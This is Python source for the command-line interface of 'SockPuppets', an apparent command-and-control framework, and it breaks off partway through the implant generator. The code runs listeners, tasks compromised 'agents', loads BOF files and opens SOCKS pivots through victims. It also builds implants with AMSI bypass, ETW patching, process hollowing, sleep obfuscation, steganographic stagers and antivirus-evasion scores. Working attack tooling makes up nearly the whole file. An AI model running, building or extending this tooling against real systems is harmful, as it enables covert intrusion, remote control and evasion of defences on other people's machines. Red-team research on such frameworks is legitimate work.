#!/usr/bin/env python3
"""
SockPuppets - C2 Framework
Main CLI Interface
Supports WebSocket, HTTP, and HTTPS transports
"""

import asyncio
import cmd
import sys
import os
import time
from pathlib import Path
from agent import AgentGenerator
from server import SockPuppetsServer, get_server_instance
import threading


try:
    from ui.theme import (console, print_banner, print_status, print_agents_table,
                          print_listeners_table, print_help_panel, print_generate_results,
                          print_interact_banner, print_command_result)
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

ASCII_ART = r"""
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
|   __|     |     |  |  |  _  |  |  |  _  |  _  |   __|_   _|   __|
|__   |  |  |   --|    -|   __|  |  |   __|   __|   __|  |  |__   |
|_____|_____|_____|__|__|__|  |_____|__|  |__|  |_____|  |  |_____|

                    by AJ Hammond @ajm4n
"""


class SockPuppetsCLI(cmd.Cmd):
    """Interactive CLI for SockPuppets"""

    prompt = "\033[1;36msockpuppets>\033[0m "

    @property
    def intro(self):
        if HAS_RICH:
            print_banner()
            return ""
        return ASCII_ART + "\nType 'help' for available commands.\n"

    def __init__(self):
        super().__init__()
        self.server = None
        self.server_running = False
        self.current_agent = None
        self.loop = None
        self.encryption_key = 'SOCKPUPPETS_KEY_2026'

    def preloop(self):
        """Called before cmdloop starts -- handle deferred GUI start."""
        gui_port = getattr(self, '_start_gui_on_ready', None)
        if gui_port:
            self._ensure_server()
            self.do_gui(f'start {gui_port}')

    def _ensure_server(self):
        """Ensure server instance exists and event loop is running"""
        if self.server is None:
            self.server = SockPuppetsServer(self.encryption_key)

        if self.loop is None or not self.loop.is_running():
            ready = threading.Event()
            def run_loop():
                self.loop = asyncio.new_event_loop()
                asyncio.set_event_loop(self.loop)
                ready.set()
                self.loop.run_forever()

            thread = threading.Thread(target=run_loop, daemon=True)
            thread.start()
            if not ready.wait(timeout=5.0):
                print("[-] Failed to start event loop")
                return

        self.server_running = True

    def do_start(self, arg):
        """Start a listener: start [http|https] [host] [port] [--key=K] [--cert=PATH] [--certkey=PATH]"""
        args = arg.split()

        # Determine listener type
        listener_type = 'websocket'
        if args and args[0].lower() in ('http', 'https', 'ws', 'websocket'):
            listener_type = args.pop(0).lower()
            if listener_type == 'ws':
                listener_type = 'websocket'

        host = '0.0.0.0'
        port = None
        key = self.encryption_key
        cert_path = None
        certkey_path = None

        # Default ports per listener type
        default_ports = {'websocket': 8443, 'http': 8080, 'https': 443}

        positional_idx = 0
        i = 0
        while i < len(args):
            a = args[i]
            if a.startswith('--key='):
                key = a.split('=', 1)[1]
                self.encryption_key = key
            elif a.startswith('--key') and i + 1 < len(args) and '=' not in a:
                i += 1
                key = args[i]
                self.encryption_key = key
            elif a.startswith('--certkey='):
                certkey_path = a.split('=', 1)[1]
            elif a == '--certkey' and i + 1 < len(args):
                i += 1
                certkey_path = args[i]
            elif a.startswith('--cert='):
                cert_path = a.split('=', 1)[1]
            elif a == '--cert' and i + 1 < len(args):
                i += 1
                cert_path = args[i]
            elif not a.startswith('--'):
                if positional_idx == 0:
                    host = a
                    positional_idx += 1
                elif positional_idx == 1:
                    try:
                        port = int(a)
                    except ValueError:
                        print("[-] Invalid port number")
                        return
                    positional_idx += 1
            i += 1

        if port is None:
            port = default_ports.get(listener_type, 8443)

        self._ensure_server()
        # Update encryption key if changed
        self.server.encryption_key = self.encryption_key.encode() if isinstance(self.encryption_key, str) else self.encryption_key

        print(f"[*] Starting {listener_type.upper()} listener on {host}:{port}...")

        try:
            if listener_type == 'websocket':
                future = asyncio.run_coroutine_threadsafe(
                    self.server.start_ws_listener(host, port), self.loop
                )
                future.result(timeout=5)
            elif listener_type == 'http':
                future = asyncio.run_coroutine_threadsafe(
                    self.server.start_http_listener(host, port), self.loop
                )
                future.result(timeout=5)
            elif listener_type == 'https':
                future = asyncio.run_coroutine_threadsafe(
                    self.server.start_https_listener(host, port, cert_path, certkey_path), self.loop
                )
                future.result(timeout=5)

            print(f"[+] {listener_type.upper()} listener started on {host}:{port}")
            if key != 'SOCKPUPPETS_KEY_2026':
                print(f"[+] Using custom encryption key")
            if listener_type == 'https' and cert_path:
                print(f"[+] Using custom certificate: {cert_path}")
            elif listener_type == 'https':
                print(f"[+] Using auto-generated self-signed certificate")

        except Exception as e:
            print(f"[-] Failed to start listener: {str(e)}")

    def do_listeners(self, arg):
        """List all active listeners"""
        if not self.server:
            print("[-] No server running")
            return

        listeners = self.server.get_listeners()
        if not listeners:
            print("[-] No active listeners")
            return

        if HAS_RICH:
            print_listeners_table(listeners)
            return

        print("\n\033[1mActive Listeners:\033[0m")
        print("=" * 70)
        for l in listeners:
            type_color = {
                'websocket': '\033[94m',  # Blue
                'http': '\033[93m',       # Yellow
                'https': '\033[92m'       # Green
            }.get(l['type'], '\033[0m')
            print(f"  {type_color}[{l['type'].upper()}]\033[0m {l['host']}:{l['port']}  (started: {l['started_at']})")
        print()

    def do_stop(self, arg):
        """Stop listener(s): stop [ws|http|https] (no arg = stop all)"""
        if not self.server:
            print("[-] No server running")
            return

        arg = arg.strip().lower()
        listener_type = None
        if arg in ('ws', 'websocket'):
            listener_type = 'websocket'
        elif arg in ('http', 'https'):
            listener_type = arg
        elif arg:
            print("[-] Usage: stop [ws|http|https] (no arg = stop all)")
            return

        try:
            future = asyncio.run_coroutine_threadsafe(
                self.server.stop_listener(listener_type), self.loop
            )
            future.result(timeout=5)

            if listener_type:
                print(f"[+] {listener_type.upper()} listener(s) stopped")
            else:
                # Full cleanup when stopping all listeners
                self.server.active_connections.clear()
                self.server.agents.clear()
                print("[+] All listeners stopped")
                self.server_running = False

        except Exception as e:
            print(f"[-] Error stopping listener: {str(e)}")

    def _format_agent_list(self, agents, title, active_ids):
        """Shared helper for formatting agent lists"""
        print(f"\n\033[1m{title}:\033[0m")
        print("=" * 80)
        for agent in agents:
            status = "\033[92m●\033[0m" if agent['id'] in active_ids else "\033[91m●\033[0m"
            mode = agent['mode']
            transport = agent.get('transport', 'websocket').upper()
            if mode == 'beacon':
                mode_badge = f"\033[93m[BEACON/{transport}]\033[0m"
            else:
                mode_badge = f"\033[92m[STREAM/{transport}]\033[0m"

            print(f"{status} \033[1m{agent['id']}\033[0m {mode_badge}")
            print(f"   Hostname:   {agent['hostname']}")
            print(f"   Username:   {agent['username']}")
            print(f"   OS:         {agent['os']}")
            print(f"   IP:         {agent['ip']}")
            print(f"   Connected:  {agent['connected_at']}")
            print(f"   Last Seen:  {agent['last_seen']}")
            if mode == 'beacon':
                jitter_str = f" ±{agent.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent else ""
                print(f"   Beacon:     {agent['beacon_interval']}s{jitter_str} interval")
                health_warning = self.server.check_agent_health(agent['id'])
                if health_warning:
                    print(f"   \033[1;31m⚠ WARNING: {health_warning}\033[0m")
            print()

    def do_agents(self, arg):
        """List all agents"""
        if not self.server:
            if HAS_RICH:
                print_status("No server running. Start a listener first with 'start'", "warning")
            else:
                print("[-] No server running. Start a listener first with 'start'")
            return

        agents = self.server.get_agent_list()
        if not agents:
            if HAS_RICH:
                print_status("No agents connected", "warning")
            else:
                print("[-] No agents connected")
            return

        active_ids = {a['id'] for a in self.server.get_active_agents()}
        if HAS_RICH:
            print_agents_table(agents, active_ids)
        else:
            self._format_agent_list(agents, "Connected Agents", active_ids)

    def do_puppets(self, arg):
        """List all agents (alias for 'agents')"""
        return self.do_agents(arg)

    def do_beacons(self, arg):
        """List only beacon mode agents"""
        if not self.server:
            print("[-] No server running. Start a listener first with 'start'")
            return

        agents = [a for a in self.server.get_agent_list() if a['mode'] == 'beacon']
        if not agents:
            print("[-] No beacon agents connected")
            return

        active_ids = {a['id'] for a in self.server.get_active_agents()}
        self._format_agent_list(agents, "Beacon Agents", active_ids)

    def do_streamers(self, arg):
        """List only streaming mode agents"""
        if not self.server:
            print("[-] No server running. Start a listener first with 'start'")
            return

        agents = [a for a in self.server.get_agent_list() if a['mode'] == 'streaming']
        if not agents:
            print("[-] No streaming agents connected")
            return

        active_ids = {a['id'] for a in self.server.get_active_agents()}
        self._format_agent_list(agents, "Streaming Agents", active_ids)

    def do_remove(self, arg):
        """Remove a dead agent from tracking: remove <agent_id>"""
        if not self.server_running:
            print("[-] Server is not running")
            return

        if not arg:
            print("[-] Usage: remove <agent_id>")
            return

        agent_id = arg.strip()
        if agent_id not in self.server.agents:
            print(f"[-] Agent {agent_id} not found")
            return

        agent = self.server.agents[agent_id]
        if agent.websocket and agent.websocket in self.server.active_connections:
            self.server.active_connections.discard(agent.websocket)
        del self.server.agents[agent_id]
        print(f"[+] Agent {agent_id} removed from tracking")

    def do_interact(self, arg):
        """Interact with an agent: interact <agent_id>"""
        if not self.server:
            print("[-] No server running")
            return

        if not arg:
            print("[-] Usage: interact <agent_id>")
            return

        agent_id = arg.strip()
        agents = {a['id']: a for a in self.server.get_agent_list()}

        if agent_id not in agents:
            print(f"[-] Agent {agent_id} not found")
            return

        self.current_agent = agent_id
        agent_info = agents[agent_id]
        mode = agent_info['mode']
        transport = agent_info.get('transport', 'websocket')

        # Check if beacon might be dead
        if mode == 'beacon':
            death_status = self.server.check_agent_health(agent_id)
            if death_status:
                print(f"\033[1;31m[!] WARNING: {death_status}\033[0m")

        print(f"[+] Interacting with agent {agent_id} ({agent_info['hostname']})")
        print(f"[*] Mode: {mode.upper()} | Transport: {transport.upper()}")
        if mode == 'beacon':
            jitter_str = f" ±{agent_info.get('beacon_jitter', '0')}" if 'beacon_jitter' in agent_info else ""
            print(f"[*] Beacon interval: {agent_info['beacon_interval']}s{jitter_str}")
            active_agents = {a['id'] for a in self.server.get_active_agents()}
            if agent_id not in active_agents:
                print(f"[*] Status: Disconnected (waiting for checkin)")
        print("[*] Type 'back' or 'exit' to return to main menu")
        print("[*] Type 'kill' to terminate the agent")
        print("[*] Type 'results' to view pending results")
        if not self.server.agents.get(agent_id, None) or not self.server.agents[agent_id].is_http():
            print("[*] Type 'socks <port>' to start SOCKS proxy")
        print("[*] Type 'sleep <seconds>' to set beacon interval")
        print("[*] Type 'upgrade' to switch to streaming mode")
        print("[*] Type 'downgrade [seconds]' to switch to beacon mode")
        if self.server.agents.get(agent_id) and self.server.agents[agent_id].is_http():
            print("[*] Type 'upgrade_ws' to upgrade to WebSocket transport")

        # Track last seen results for auto-display (beacon mode only)
        last_result_count = 0
        result_check_thread = None
        stop_checking = threading.Event()

        def check_results():
            """Background thread to check for new results"""
            nonlocal last_result_count
            while not stop_checking.is_set() and self.current_agent:
                try:
                    current_agent = self.server.agents.get(agent_id)
                    if current_agent and current_agent.mode == 'beacon':
                        current_results = self.server.get_agent_results(agent_id, clear=False)
                        if len(current_results) > last_result_count:
                            new_results = current_results[last_result_count:]
                            for res in new_results:
                                cmd_text = res.get('command', 'Unknown')
                                output = res.get('output', '')
                                print(f"\n\033[1;32m[+] Result for: {cmd_text}\033[0m")
                                print(output)
                                print(f"\033[1;33magent[{agent_id}]>\033[0m ", end='', flush=True)
                            last_result_count = len(current_results)
                            self.server.get_agent_results(agent_id, clear=True)
                            last_result_count = 0
                except Exception:
                    pass
                time.sleep(1)

        result_check_thread = threading.Thread(target=check_results, daemon=True)
        result_check_thread.start()

        try:
            while self.current_agent:
                try:
                    command = input(f"\033[1;33magent[{agent_id}]>\033[0m ").strip()

                    if command.lower() in ['back', 'exit']:
                        self.current_agent = None
                        print("[*] Returning to main menu")
                        break

                    if command.lower() == 'kill':
                        if not self.loop:
                            print("[-] Event loop not available")
                            continue

                        try:
                            current_agent = self.server.agents.get(agent_id)
                            if current_agent and current_agent.mode == 'beacon' and not current_agent.is_http():
                                print(f"[*] Waiting for beacon to check in...")
                                timeout = 65
                            else:
                                timeout = 5

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.kill_agent(agent_id),
                                self.loop
                            )
                            result = future.result(timeout=timeout)
                            print(f"[+] {result}")

                            if "killed" in result.lower() or "queued" in result.lower() or "removed" in result.lower():
                                self.current_agent = None
                                print("[*] Returning to main menu")
                                break
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if command.lower().startswith('bof '):
                        parts = command.split(None, 1)
                        if len(parts) < 2:
                            print("[-] Usage: bof <path-to-.o> [type:value ...]")
                            continue

                        bof_args_raw = parts[1].split()
                        bof_path = bof_args_raw[0]
                        bof_cli_args = bof_args_raw[1:] if len(bof_args_raw) > 1 else []

                        if not os.path.exists(bof_path):
                            print(f"[-] BOF file not found: {bof_path}")
                            continue

                        try:
                            import base64
                            from evasion.bof_packer import parse_bof_args

                            with open(bof_path, 'rb') as f:
                                bof_data = base64.b64encode(f.read()).decode()
                            bof_args = base64.b64encode(parse_bof_args(bof_cli_args)).decode()

                            print(f"[*] Loading BOF: {os.path.basename(bof_path)}")
                            if bof_cli_args:
                                print(f"[*] Args: {' '.join(bof_cli_args)}")

                            current_agent_info = self.server.agents.get(agent_id)
                            if current_agent_info and current_agent_info.mode == 'beacon':
                                print(f"[*] Waiting for beacon to check in...")
                                timeout = 65
                            else:
                                timeout = 65

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.send_bof_to_agent(agent_id, bof_data, bof_args),
                                self.loop
                            )
                            result = future.result(timeout=timeout)
                            print(result)
                        except Exception as e:
                            print(f"[-] BOF error: {str(e)}")
                        continue

                    if command.lower() == 'results':
                        results = self.server.get_agent_results(agent_id, clear=False)
                        if not results:
                            print("[*] No pending results")
                        else:
                            print(f"\n[+] Pending Results ({len(results)}):")
                            print("=" * 80)
                            for i, res in enumerate(results, 1):
                                cmd_text = res.get('command', 'Unknown')
                                output = res.get('output', '')
                                received = res.get('received_at', '')
                                print(f"\n[{i}] Command: {cmd_text}")
                                print(f"    Received: {received}")
                                print(f"    Output:\n{output}")
                                print("-" * 80)

                            try:
                                clear_choice = input("\nClear these results? [y/N]: ").strip().lower()
                                if clear_choice == 'y':
                                    self.server.get_agent_results(agent_id, clear=True)
                                    print("[+] Results cleared")
                            except:
                                pass
                        continue

                    if command.lower().startswith('socks'):
                        parts = command.split()
                        if len(parts) != 2:
                            print("[-] Usage: socks <port>")
                            continue

                        try:
                            socks_port = int(parts[1])
                            if not self.loop:
                                print("[-] Event loop not available")
                                continue

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.start_socks_proxy(agent_id, socks_port),
                                self.loop
                            )
                            result = future.result(timeout=5)
                            print(f"[+] {result}")
                        except ValueError:
                            print("[-] Invalid port number")
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if command.lower().startswith('sleep'):
                        parts = command.split()
                        if len(parts) != 2:
                            print("[-] Usage: sleep <seconds>")
                            continue

                        try:
                            interval = int(parts[1])
                            if not self.loop:
                                print("[-] Event loop not available")
                                continue

                            current_agent = self.server.agents.get(agent_id)
                            if current_agent and current_agent.mode == 'beacon' and not current_agent.is_http():
                                print(f"[*] Waiting for beacon to check in...")
                                timeout = 65
                            else:
                                timeout = 5

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.set_beacon_interval(agent_id, interval),
                                self.loop
                            )
                            result = future.result(timeout=timeout)
                            print(f"[+] {result}")
                        except ValueError:
                            print("[-] Invalid interval")
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if command.lower() == 'upgrade':
                        if not self.loop:
                            print("[-] Event loop not available")
                            continue

                        try:
                            current_agent = self.server.agents.get(agent_id)
                            if current_agent and current_agent.mode == 'beacon' and not current_agent.is_http():
                                print(f"[*] Waiting for beacon to check in (interval: {current_agent.beacon_interval}s)...")
                                timeout = 65
                            else:
                                timeout = 5

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.upgrade_to_streaming(agent_id),
                                self.loop
                            )
                            result = future.result(timeout=timeout)
                            print(f"[+] {result}")
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if command.lower() == 'upgrade_ws':
                        if not self.loop:
                            print("[-] Event loop not available")
                            continue

                        try:
                            future = asyncio.run_coroutine_threadsafe(
                                self.server.upgrade_to_websocket(agent_id),
                                self.loop
                            )
                            result = future.result(timeout=5)
                            print(f"[+] {result}")
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if command.lower().startswith('downgrade'):
                        parts = command.split()
                        interval = 60
                        if len(parts) == 2:
                            try:
                                interval = int(parts[1])
                            except ValueError:
                                print("[-] Invalid interval")
                                continue

                        if not self.loop:
                            print("[-] Event loop not available")
                            continue

                        try:
                            future = asyncio.run_coroutine_threadsafe(
                                self.server.downgrade_to_beacon(agent_id, interval),
                                self.loop
                            )
                            result = future.result(timeout=5)
                            print(f"[+] {result}")
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                        continue

                    if not command:
                        continue

                    if not self.loop:
                        print("[-] Event loop not available")
                        break

                    future = asyncio.run_coroutine_threadsafe(
                        self.server.send_command_to_agent(agent_id, command),
                        self.loop
                    )

                    current_agent = self.server.agents.get(agent_id)
                    if current_agent and current_agent.mode == 'streaming':
                        print("[*] Executing command...")
                        # HTTP long-poll needs more time
                        timeout = 65 if current_agent.is_http() else 35
                        result = future.result(timeout=timeout)
                        print(result)
                    else:
                        # Beacon mode - just queue
                        result = future.result(timeout=5)
                        print(result)

                except KeyboardInterrupt:
                    print("\n[*] Use 'back' to return to main menu")
                except Exception as e:
                    print(f"[-] Error: {str(e)}")
        finally:
            stop_checking.set()
            if result_check_thread:
                result_check_thread.join(timeout=2)

    def do_generate(self, arg):
        """Generate agents: generate <host> <port> [options]"""
        args = arg.split()

        if len(args) < 2:
            print("[-] Usage: generate <host> <port> [options]")
            print("    Options:")
            print("      --lang=LANG            Language: python, go, rust, csharp, c, powershell, all")
            print("      --transport=TYPE       Transport: websocket, http, https (default: websocket)")
            print("      --beacon               Enable beacon mode")
            print("      --interval=N           Beacon interval in seconds")
            print("      --jitter=N             Beacon jitter percentage (0-100)")
            print("      --os=OS                Target OS (auto, windows, linux, macos)")
            print("      --arch=ARCH            Target architecture (x64, arm64, amd64)")
            print("      --staged               Generate staged payload (tiny loader)")
            print("      --stego                Embed agent in PNG image + generate stager stubs")
            print("      --stego-method=METHOD  Stego method: append (default) or chunk")
            print("      --shellcode            Generate shellcode blob")
            print("      --format=FMT           Shellcode format (raw, c, python, powershell, csharp)")
            print("      --compile              Compile Python agent to executable")
            print("      --dll                  Compile Python agent to DLL (Windows)")
            print("      --multi-os             Generate agents for all OS types")
            print("      --multi-arch           Compile for all architectures")
            print("      --no-upx               Disable UPX compression")
            print("      --icon=PATH            Icon file for executable")
            print("      --key=KEY              Encryption key")
            print("      --oneliners=URL        Generate one-liner payloads")
            print()
            print("    Languages available: python go rust csharp c powershell")
            print("    VT scores: python=0/62 go=3/71 rust=4/71 c=6/71 csharp=12/70")
            print("    Recommended: python (scripting) or go (compiled)")
            print()
            print("    Evasion options:")
            print("      --amsi                 Enable AMSI bypass (Windows, Python/PS)")
            print("      --etw                  Enable ETW patching (Windows, Python/PS)")
            print("      --syscalls=MODE        Syscall wrappers: indirect (default), direct")
            print("      --inject=TECHNIQUE     Injection: createthread, apc, hollowing, stomp")
            print("      --inject-target=PROC   Target process for injection (default: auto)")
            print("      --sleep-obf=TECHNIQUE  Sleep obfuscation: ekko (default), foliage")
            print("      --idle-encrypt=SEC     Streaming idle threshold in seconds (default: 30)")
            print("      --profile=NAME         Malleable C2 profile (default: default)")
            print("      --patterns=NAME        Obfuscation pattern set (default: default)")
            print("      --redirector=NAME      Route agents through a redirector config")
            print("      --obfuscation=MODE     Obfuscation: dynamic, default, or name1,name2")
            print("      --bof                  Enable BOF loader in agent")
            print("      --evasion-all          Enable all evasion features with defaults")
            print()
            print("    Environmental keying (Go agent only):")
            print("      --env-hostname=NAME    Lock agent to specific hostname (regex with ~ prefix)")
            print("      --env-domain=DOMAIN    Lock agent to domain-joined environment")
            print("      --env-mac=PREFIX       Lock agent to MAC address prefix (e.g., 00:50:56)")
            print("      --env-registry=PATH    Lock agent to registry key (e.g., HKLM\\SOFTWARE\\Corp)")
            print("      --env-string=STRING    Lock agent to file path or environment string")
            return

        host = None
        port = None
        key = self.encryption_key
        lang = 'python'  # default language
        compile_exe = False
        compile_dll = False
        gen_shellcode = False
        shellcode_format = 'raw'
        beacon_mode = False
        beacon_interval = 60
        beacon_jitter = 0
        architectures = ['x64']
        use_upx = True
        icon = None
        target_os = 'auto'
        multi_os = False
        oneliners_url = None
        transport = 'websocket'
        staged = False
        stego = False
        stego_method = 'append'
        amsi = False
        etw = False
        syscalls = None
        inject = None
        inject_target = None
        sleep_obf = None
        idle_encrypt = 30
        profile = 'default'
        patterns = 'default'
        redirector = None
        bof = False
        obfuscation = None
        evasion_all = False
        env_hostname = ''
        env_domain = ''
        env_mac = ''
        env_registry = ''
        env_string = ''

        i = 0
        while i < len(args):
            arg = args[i]

            def get_value(flag_name):
                nonlocal i
                if '=' in arg:
                    return arg.split('=', 1)[1]
                elif i + 1 < len(args):
                    i += 1
                    return args[i]
                else:
                    print(f"[-] {flag_name} requires a value")
                    return None

            if arg.startswith('--lang'):
                val = get_value('--lang')
                if val is None:
                    return
                if val in ['python', 'go', 'rust', 'csharp', 'c', 'powershell', 'all']:
                    lang = val
                else:
                    print(f"[-] Invalid language: {val}. Use: python, go, rust, csharp, c, powershell, all")
                    return
            elif arg == '--staged':
                staged = True
            elif arg == '--stego':
                stego = True
            elif arg.startswith('--stego-method'):
                val = get_value('--stego-method')
                if val is None:
                    return
                if val in ('append', 'chunk'):
                    stego_method = val
                else:
                    print(f"[-] Invalid stego method: {val}. Use: append, chunk")
                    return
            elif arg.startswith('--key'):
                val = get_value('--key')
                if val is None:
                    return
                key = val
            elif arg.startswith('--transport'):
                val = get_value('--transport')
                if val is None:
                    return
                if val in ['websocket', 'ws', 'http', 'https']:
                    transport = 'websocket' if val == 'ws' else val
                else:
                    print(f"[-] Invalid transport: {val}. Use: websocket, http, https")
                    return
            elif arg.startswith('--interval'):
                val = get_value('--interval')
                if val is None:
                    return
                try:
                    beacon_interval = int(val)
                except ValueError:
                    print("[-] Invalid interval value")
                    return
            elif arg.startswith('--jitter'):
                val = get_value('--jitter')
                if val is None:
                    return
                try:
                    beacon_jitter = int(val)
                    if beacon_jitter < 0 or beacon_jitter > 100:
                        print("[-] Jitter must be between 0 and 100")
                        return
                except ValueError:
                    print("[-] Invalid jitter value")
                    return
            elif arg.startswith('--arch'):
                val = get_value('--arch')
                if val is None:
                    return
                if val in ['x86', 'x64', 'arm64']:
                    architectures = [val]
                else:
                    print(f"[-] Invalid architecture: {val}")
                    return
            elif arg.startswith('--icon'):
                val = get_value('--icon')
                if val is None:
                    return
                icon = val
                if not os.path.exists(icon):
                    print(f"[-] Icon file not found: {icon}")
                    return
            elif arg.startswith('--format'):
                val = get_value('--format')
                if val is None:
                    return
                if val in ['raw', 'c', 'python', 'powershell']:
                    shellcode_format = val
                else:
                    print(f"[-] Invalid shellcode format: {val}")
                    return
            elif arg.startswith('--os'):
                val = get_value('--os')
                if val is None:
                    return
                if val in ['auto', 'windows', 'linux', 'macos']:
                    target_os = val
                else:
                    print(f"[-] Invalid OS: {val}")
                    return
            elif arg.startswith('--oneliners'):
                val = get_value('--oneliners')
                if val is None:
                    return
                oneliners_url = val
            elif arg == '--compile':
                compile_exe = True
            elif arg == '--dll':
                compile_dll = True
            elif arg == '--shellcode':
                gen_shellcode = True
            elif arg == '--beacon':
                beacon_mode = True
            elif arg == '--multi-arch':
                architectures = ['x86', 'x64', 'arm64']
                compile_exe = True
            elif arg == '--multi-os':
                multi_os = True
            elif arg == '--no-upx':
                use_upx = False
            elif arg == '--amsi':
                amsi = True
            elif arg == '--etw':
                etw = True
            elif arg.startswith('--syscalls'):
                val = get_value('--syscalls')
                if val is None:
                    return
                if val in ['direct', 'indirect']:
                    syscalls = val
                else:
                    print(f"[-] Invalid syscalls mode: {val}. Use: direct, indirect")
                    return
            elif arg.startswith('--inject-target'):
                val = get_value('--inject-target')
                if val is None:
                    return
                inject_target = val
            elif arg.startswith('--inject'):
                val = get_value('--inject')
                if val is None:
                    return
                if val in ['createthread', 'apc', 'hollowing', 'stomp']:
                    inject = val
                else:
                    print(f"[-] Invalid inject technique: {val}. Use: createthread, apc, hollowing, stomp")
                    return
            elif arg.startswith('--sleep-obf'):
                val = get_value('--sleep-obf')
                if val is None:
                    return
                if val in ['ekko', 'foliage']:
                    sleep_obf = val
                else:
                    print(f"[-] Invalid sleep-obf technique: {val}. Use: ekko, foliage")
                    return
            elif arg.startswith('--idle-encrypt'):
                val = get_value('--idle-encrypt')
                if val is None:
                    return
                try:
                    idle_encrypt = int(val)
                except ValueError:
                    print("[-] Invalid idle-encrypt value")
                    return
            elif arg.startswith('--profile'):
                val = get_value('--profile')
                if val is None:
                    return
                profile = val
            elif arg.startswith('--patterns'):
                val = get_value('--patterns')
                if val is None:
                    return
                patterns = val
            elif arg.startswith('--redirector'):
                val = get_value('--redirector')
                if val is None:
                    return
                redirector = val
            elif arg.startswith('--obfuscation'):
                val = get_value('--obfuscation')
                if val is None:
                    return
                obfuscation = val
            elif arg == '--bof':
                bof = True
            elif arg == '--evasion-all':
                evasion_all = True
            elif arg.startswith('--env-hostname'):
                val = get_value('--env-hostname')
                if val is None:
                    return
                env_hostname = val
            elif arg.startswith('--env-domain'):
                val = get_value('--env-domain')
                if val is None:
                    return
                env_domain = val
            elif arg.startswith('--env-mac'):
                val = get_value('--env-mac')
                if val is None:
                    return
                env_mac = val
            elif arg.startswith('--env-registry'):
                val = get_value('--env-registry')
                if val is None:
                    return
                env_registry = val
            elif arg.startswith('--env-string'):
                val = get_value('--env-string')
                if val is None:
                    return
                env_string = val
            elif host is None:
                host = arg
            elif port is None:
                try:
                    port = int(arg)
                except ValueError:
                    print("[-] Invalid port number")
                    return

            i += 1

        if not host or port is None:
            print("[-] Usage: generate <host> <port> [options]")
            return

        # Handle --evasion-all shortcut
        if evasion_all:
            amsi = True
            etw = True
            bof = True
            if syscalls is None:
                syscalls = 'indirect'
            if inject is None:
                inject = 'hollowing'
            if sleep_obf is None:
                sleep_obf = 'ekko'
            if obfuscation is None:
                obfuscation = 'dynamic'

        # HTTP/HTTPS agents default to beacon mode (use --stream to override)
        if transport in ('http', 'https') and not beacon_mode:
            beacon_mode = True

        print(f"[*] Generating agents for {host}:{port}...")
        print(f"[*] Transport: {transport.upper()}")
        if key != 'SOCKPUPPETS_KEY_2026':
            print(f"[*] Using custom encryption key")
        if beacon_mode:
            jitter_text = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
            print(f"[*] Beacon mode enabled ({beacon_interval}s{jitter_text} interval)")
        if target_os != 'auto':
            print(f"[*] Target OS: {target_os}")
        if multi_os:
            print(f"[*] Multi-OS generation enabled")
        if compile_exe:
            print(f"[*] Compilation enabled for: {', '.join(architectures)}")
            if use_upx:
                print(f"[*] UPX compression enabled")
            if icon:
                print(f"[*] Using icon: {icon}")
        if compile_dll:
            print(f"[*] DLL compilation enabled")
        if gen_shellcode:
            print(f"[*] Shellcode generation enabled ({shellcode_format} format)")

        # Print evasion feature summary
        if amsi or etw or syscalls or inject or sleep_obf or bof or obfuscation or profile != 'default':
            print(f"[*] Evasion features:")
            if amsi:
                print(f"    - AMSI bypass")
            if etw:
                print(f"    - ETW patching")
            if syscalls:
                print(f"    - Syscalls ({syscalls})")
            if inject:
                target_desc = f" -> {inject_target}" if inject_target else ""
                print(f"    - Process injection ({inject}{target_desc})")
            if sleep_obf:
                print(f"    - Sleep obfuscation ({sleep_obf}, idle={idle_encrypt}s)")
            if profile != 'default':
                print(f"    - C2 profile: {profile}")
            if patterns != 'default':
                print(f"    - Obfuscation patterns: {patterns}")
            if redirector:
                print(f"    - Redirector: {redirector}")
            if bof:
                print(f"    - BOF loader")
            if obfuscation:
                print(f"    - Obfuscation: {obfuscation}")

        # Print environmental keying summary
        env_keys = {
            'hostname': env_hostname, 'domain': env_domain,
            'MAC prefix': env_mac, 'registry': env_registry,
            'string/file': env_string,
        }
        active_keys = {k: v for k, v in env_keys.items() if v}
        if active_keys:
            print(f"[*] Environmental keying (Go agent):")
            for check, val in active_keys.items():
                print(f"    - {check}: {val}")

        generator = AgentGenerator(patterns=patterns)
        results = {}

        # Language-specific generation
        if lang in ('go', 'all'):
            print(f"\n[*] Generating Go agent...")
            try:
                arch = 'amd64' if 'x64' in architectures else architectures[0]
                go_fmt = 'exe'
                if compile_dll:
                    go_fmt = 'dll'
                elif gen_shellcode:
                    go_fmt = 'shellcode'
                go_path = generator.generate_go_agent(
                    host, port, encryption_key=key, transport=transport,
                    beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
                    target_os=target_os if target_os != 'auto' else 'windows',
                    target_arch=arch, garble=False,
                    output_format=go_fmt,
                    env_hostname=env_hostname, env_domain=env_domain,
                    env_mac=env_mac, env_registry=env_registry,
                    env_string=env_string,
                )
                results['go'] = go_path
                if gen_shellcode and go_fmt == 'exe':
                    try:
                        sc_path = generator.generate_shellcode_blob(
                            host, port, encryption_key=key, transport=transport,
                            beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
                            target_os=target_os if target_os != 'auto' else 'windows',
                            target_arch=arch, shellcode_format=shellcode_format,
                        )
                        results['go_shellcode'] = sc_path
                    except Exception as e:
                        results['go_shellcode'] = f"Error: {e}"
            except Exception as e:
                results['go'] = f"Error: {e}"

        if lang in ('rust', 'all'):
            print(f"\n[*] Generating Rust agent...")
            try:
                arch = 'amd64' if 'x64' in architectures else architectures[0]
                go_path = generator.generate_rust_agent(
                    host, port, encryption_key=key, transport=transport,
                    beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
                    target_os=target_os if target_os != 'auto' else 'windows',
                    target_arch=arch
                )
                results['rust'] = go_path
            except Exception as e:
                results['rust'] = f"Error: {e}"

        if lang in ('csharp', 'all'):
